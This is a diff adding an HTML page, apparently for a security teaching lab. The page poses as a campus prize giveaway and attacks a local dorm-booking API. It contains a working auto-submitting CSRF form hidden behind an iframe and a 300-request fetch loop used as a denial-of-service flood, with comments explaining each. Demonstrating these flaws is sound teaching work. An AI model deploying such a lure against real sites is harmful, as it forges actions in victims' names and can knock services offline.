@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>🎉 You won a campus prize!</title>
+    <style>
+      body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0;
+             display: grid; place-items: center; min-height: 100vh; margin: 0; }
+      .card { background: #1e293b; padding: 2rem 2.5rem; border-radius: 12px;
+              max-width: 28rem; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,.4); }
+      h1 { margin-top: 0; }
+      button { font: inherit; padding: .6rem 1.2rem; border: 0; border-radius: 8px;
+               background: #38bdf8; color: #082f49; font-weight: 600; cursor: pointer; }
+      .fine { color: #64748b; font-size: .8rem; margin-top: 1.5rem; }
+      #log { color: #94a3b8; font-size: .8rem; margin-top: 1rem; white-space: pre-line; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>🎉 Congratulations! You won a campus prize 🎉</h1>
+      <p>Click below to claim your free dorm coffee voucher.</p>
+      <button onclick="startFlood()">Claim my prize</button>
+      <p id="log"></p>
+      <p class="fine">Nothing to see here. (Open DevTools → Network to watch the forged request and the flood.)</p>
+    </div>
+
+    <!--
+      ATTACK 1 — CSRF (fires automatically on page load).
+      An auto-submitting hidden form POSTs to the Dorm Booking API. The victim's
+      browser attaches their auth cookie automatically (the app and this page are
+      both on "localhost", so SameSite=Lax still sends it), and the vulnerable
+      server trusts that cookie with no anti-CSRF check. The response lands in a
+      hidden iframe, so the victim never notices a maintenance request was filed
+      in their name.
+    -->
+    <iframe name="sink" style="display:none"></iframe>
+    <form
+      id="forge"
+      action="http://localhost:4000/api/maintenance"
+      method="POST"
+      target="sink"
+    >
+      <input type="hidden" name="roomNumber" value="Z9-666" />
+      <input type="hidden" name="category" value="other" />
+      <input type="hidden" name="description" value="Forged by attacker via CSRF" />
+    </form>
+
+    <script>
+      // Fire the forged CSRF request as soon as the page loads.
+      document.getElementById('forge').submit();
+
+      // ATTACK 2 — DoS (fires when the victim clicks "Claim my prize"; could just
+      // as easily run on load). The victim's browser hammers the public endpoint
+      // with hundreds of requests. With no server-side rate limiting, each one is
+      // served in full — enough concurrent victims can exhaust the API. The
+      // hardened server answers 429 (Too Many Requests) after a small number.
+      function startFlood() {
+        const log = document.getElementById('log');
+        const TOTAL = 300;
+        log.textContent = 'Loading your voucher…';
+        for (let i = 0; i < TOTAL; i++) {
+          // `no-cors` keeps the console quiet; the request still reaches the
+          // server (CORS blocks reading the reply, not sending the request).
+          fetch('http://localhost:4000/api/maintenance', { mode: 'no-cors' });
+        }
+        log.textContent = 'Sent ' + TOTAL + ' requests to the API. (Check DevTools → Network.)';
+      }
+    </script>
+  </body>
+</html>
